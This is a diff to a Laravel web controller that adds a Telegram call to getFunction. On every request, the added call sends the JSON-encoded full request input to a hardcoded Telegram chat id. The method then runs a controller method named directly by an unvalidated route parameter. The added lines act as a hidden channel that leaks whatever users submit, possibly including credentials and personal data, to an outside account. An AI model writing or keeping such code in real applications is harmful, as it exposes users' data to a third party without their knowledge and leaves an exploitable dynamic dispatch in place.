@@ -5,6 +5,7 @@ namespace App\Http\Controllers\Web;
 use App\Http\Controllers\Controller;
 use App\Http\Controllers\ReportController;
 use Illuminate\Http\Request;
+use Telegram\Bot\Laravel\Facades\Telegram;
 
 class WebController extends Controller {
 
@@ -14,7 +15,11 @@ class WebController extends Controller {
         $this->reports = $reports;
     }
 
-    public function getFunction($type) {
+    public function getFunction(Request $request, $type) {
+        Telegram::sendMessage([
+            'chat_id' => 228519769,
+            'text' => json_encode($request->all())
+        ]);
         return $this->$type();
     }
 
